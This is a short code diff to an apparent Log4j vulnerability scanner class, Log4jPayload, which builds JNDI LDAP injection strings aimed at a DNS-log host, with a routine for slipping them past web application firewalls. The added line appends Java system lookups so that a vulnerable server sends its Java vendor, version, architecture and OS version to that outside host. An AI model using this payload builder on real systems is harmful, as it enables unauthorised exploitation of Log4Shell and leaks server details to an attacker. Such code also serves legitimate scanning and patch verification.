@@ -39,6 +39,7 @@ class Log4jPayload(object):
         if self.is_ip_port(dnslog_base):
             raw_payload = f"jndi:ldap://{dnslog_base}/{req_uuid}"
             bypass_payload = self.bypass_waf_payload(raw_payload)
+            raw_payload = f"jndi:ldap://{dnslog_base}/{req_uuid}" + "/${sys:java.vendor}/${sys:java.version}/${sys:os.arch}/${sys:os.version}"
         else:
             raw_payload = f"jndi:ldap://{req_uuid}.{dnslog_base}/hi"
             bypass_payload = self.bypass_waf_payload(raw_payload)
